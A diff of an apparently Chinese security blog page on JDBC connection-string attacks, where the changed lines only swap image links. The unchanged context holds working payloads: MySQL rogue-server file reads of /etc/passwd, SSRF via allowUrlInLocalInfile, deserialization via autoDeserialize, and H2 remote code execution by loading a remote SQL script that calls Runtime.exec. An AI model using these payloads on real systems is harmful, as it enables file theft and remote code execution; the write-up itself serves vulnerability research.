@@ -408,7 +408,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span><span class="line"><span class="cl">brew services start mysql@8.0
 </span></span></code></pre></div><p>把客户端 <code>/etc/passwd</code> 读入 users 表：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">load data <span class="nb">local</span> infile <span class="s1">&#39;/etc/passwd&#39;</span> into table users fields terminated by <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
-</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image.png" alt="image.png"></p>
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228220.png" alt="image.png"></p>
 <p>对应的 LOAD DATA INFILE 是加载服务端的文件</p>
 <h3 id="漏洞原理">漏洞原理</h3>
 <p>LOAD DATA LOCAL INFILE 的工作过程大致如下：</p>
@@ -461,7 +461,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%201.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228977.png" alt="image.png"></p>
 <h3 id="allowurlinlocalinfile的使用">allowUrlInLocalInfile的使用</h3>
 <p><strong>条件</strong></p>
 <ul>
@@ -472,7 +472,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 <p>能够使用 URL 类支持的所有协议，进行 SSRF 获取 file 协议读取本地文件</p>
 <p>既然能够 ssrf 的话，那就可以列文件目录了</p>
 <p>添加 fileread：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%202.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228519.png" alt="image.png"></p>
 <p>测试代码:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
@@ -484,12 +484,12 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%203.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228997.png" alt="image.png"></p>
 <p>读到了根目录，如果这个配置没有开启的话，就是如下情况:</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%204.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228761.png" alt="image.png"></p>
 <p>既然是SSRF，那就可以通过http去访问对应网页</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:2333/test?user=fileread_http://127.0.0.1:8888/&amp;allowUrlInLocalInfile=true&#34;</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%205.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228933.png" alt="image.png"></p>
 <p>mysql 会根据 MaxAllowedPacket 参数来限制 Server 接受的数据包大小，所以 payload 可以换为：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:2333/test?user=fileread_file:///etc/passwd/&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360&#34;</span><span class="p">;</span><span class="w">
 </span></span></span></code></pre></div><h3 id="修复">修复</h3>
@@ -505,8 +505,8 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 <p>mysql蜜罐：https://github.com/qigpig/MysqlHoneypot</p>
 <h2 id="jdbc反序列化mysql"><strong>JDBC反序列化（MySql）</strong></h2>
 <p>JDBC（Java Data Base Connectivity,java数据库连接）是一种用于执行 SQL 语句的 Java API，可以为多种关系数据库提供统一访问，它由一组用 Java 语言编写的类和接口组成。JDBC 提供了一种基准，据此可以构建更高级的工具和接口，使数据库开发人员能够编写数据库应用程序。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/2.png" alt="2.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/1.png" alt="1.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228006.png" alt="2.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062228222.png" alt="1.png"></p>
 <h3 id="漏洞复现-1">漏洞复现</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">dependencies</span><span class="o">&gt;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">&lt;!--</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="c1">//mvnrepository.com/artifact/mysql/mysql-connector-java --&gt;</span><span class="w">
@@ -531,7 +531,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">conn</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%206.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229357.png" alt="image.png"></p>
 <h3 id="漏洞分析">漏洞分析</h3>
 <p>因为他不是挖链子，而是挖掘反序列化入口，所以目的就是去找可以解析传入的恶意对象，而不是把传输过去的数据当中字节数据，所以需要找一个 readObject 的地方：</p>
 <p><code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code></p>
@@ -627,10 +627,10 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>而<code>populateMapWithSessionStatusValues()</code>在<code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>的<code>postProcess()</code>和<code>preProcess()</code>方法中调用</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%207.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229465.png" alt="image.png"></p>
 <p>又因为 ServerStatusDiffInterceptor 实现了QueryInterceptor，可由<a href="https://dev.mysql.com/doc/connector-j/en/connector-j-reference-configuration-properties.html">https://dev.mysql.com/doc/connector-j/en/connector-j-reference-configuration-properties.html</a>得知：</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%208.png" alt="image.png"></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%209.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229582.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229947.png" alt="image.png"></p>
 <p>所以可以设置这两个参数</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">autoDeserialize</span><span class="o">=</span><span class="kc">true</span><span class="o">&amp;</span><span class="n">queryInterceptors</span><span class="o">=</span><span class="n">com</span><span class="p">.</span><span class="na">mysql</span><span class="p">.</span><span class="na">cj</span><span class="p">.</span><span class="na">jdbc</span><span class="p">.</span><span class="na">interceptors</span><span class="p">.</span><span class="na">ServerStatusDiffInterceptor</span><span class="w">
 </span></span></span></code></pre></div><p>现在我们找到了一条能够反序列化的路径，如果我们能控制 JDBC URI，那么可以：</p>
@@ -753,7 +753,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span><span class="line"><span class="cl">        <span class="n">Connection</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="n">getConnection</span><span class="p">(</span><span class="n">url</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2010.png" alt="image.png"></p>
+</span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229616.png" alt="image.png"></p>
 <h2 id="sqlite">SQLite</h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.xerial<span class="nt">&lt;/groupId&gt;</span>
@@ -837,7 +837,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;open -a Calculator&#34;</span><span class="p">);</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2011.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229685.png" alt="image.png"></p>
 <h2 id="db2"><strong>DB2</strong></h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.ibm.db2<span class="nt">&lt;/groupId&gt;</span>
@@ -873,14 +873,14 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">spring</span><span class="p">.</span><span class="na">datasource</span><span class="p">.</span><span class="na">url</span><span class="o">=</span><span class="n">jdbc</span><span class="p">:</span><span class="n">h2</span><span class="p">:</span><span class="n">mem</span><span class="p">:</span><span class="n">testdb</span><span class="w">		</span><span class="err">#</span><span class="w"> </span><span class="n">不加的话可以会报错</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">spring</span><span class="p">.</span><span class="na">h2</span><span class="p">.</span><span class="na">console</span><span class="p">.</span><span class="na">settings</span><span class="p">.</span><span class="na">web</span><span class="o">-</span><span class="n">allow</span><span class="o">-</span><span class="n">others</span><span class="o">=</span><span class="kc">true</span><span class="w"> </span><span class="err">#</span><span class="n">开启连接远程Web访问H2数据库</span><span class="w">
 </span></span></span></code></pre></div><p>访问<code>127.0.0.1:8080/h2-console</code></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2012.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229811.png" alt="image.png"></p>
 <p>还有一些功能</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">spring.data.jpa.repositories.bootstrap-mode=default #表示 JPA 仓库会按照默认的方式在应用启动时立即初始化
 </span></span></code></pre></div><p>创建 poc.sql</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">ALIAS</span><span class="w"> </span><span class="k">EXEC</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s1">&#39;String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return &#34;Success&#34;;}&#39;</span><span class="p">;</span><span class="k">CALL</span><span class="w"> </span><span class="k">EXEC</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;open -a Calculator.app&#39;</span><span class="p">)</span><span class="w">
 </span></span></span></code></pre></div><p>然后改变JBDC连接的URL</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">jdbc</span><span class="p">:</span><span class="n">h2</span><span class="p">:</span><span class="n">mem</span><span class="p">:</span><span class="n">testdb</span><span class="p">;</span><span class="n">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span><span class="n">3</span><span class="p">;</span><span class="n">INIT</span><span class="o">=</span><span class="n">RUNSCRIPT</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="err">&#39;</span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:8088/poc.sql&#39;</span><span class="w">
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2013.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062229942.png" alt="image.png"></p>
 <p><strong>分析</strong></p>
 <p>在<code>org.h2.engine.Engine#openSession</code>中，h2引擎首先分离出 INIT 的值为<code>RUNSCRIPT FROM 'http://127.0.0.1:8088/poc.sql'</code></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">synchronized</span><span class="w"> </span><span class="n">Session</span><span class="w"> </span><span class="nf">openSession</span><span class="p">(</span><span class="n">ConnectionInfo</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
@@ -902,7 +902,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="w">     </span><span class="p">}</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
 </span></span></span></code></pre></div><p>并使用 CommandInterface 的不同实现类来初始化数据库连接，这取决于配置。这里是<code>org.h2.command.CommandContainer</code></p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2014.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062230265.png" alt="image.png"></p>
 <p>通过使用 RUNSCRIPT 命令，h2 最终会调用<code>org.h2.command.dml.RunScriptCommand#execute</code>来执行恶意的 sql 语句。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
@@ -923,7 +923,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 <h3 id="通过源代码编译器达到不出网利用">通过源代码编译器达到不出网利用</h3>
 <p>有办法把 sql 语句减少到一句吗？</p>
 <p>Litch1 为语句的创建者查看了源码<code>CREATE ALIAS</code>，发现语句中 JAVA METHOD 的定义交给了源码编译类。支持三种编译器：Java/Javascript/Groovy。</p>
-<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2015.png" alt="image.png"></p>
+<p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062230321.png" alt="image.png"></p>
 <p><strong>JavaScript</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
@@ -1050,7 +1050,7 @@ import java.sql.Connection; import java.sql.DriverManager; import java.sql.SQLEx
 </span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/constructor-arg&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s">    &lt;/bean&gt;
 </span></span></span><span class="line"><span class="cl"><span class="s">&lt;/beans&gt;
-</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/image%2016.png" alt="image.png"></p>
+</span></span></span></code></pre></div><p><img src="https://w0s1np.oss-cn-beijing.aliyuncs.com/img/202410062230592.png" alt="image.png"></p>
 <p>还可以通过FileOutputStream将任意文件置空</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.Connection</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.sql.DriverManager</span><span class="p">;</span><span class="w">
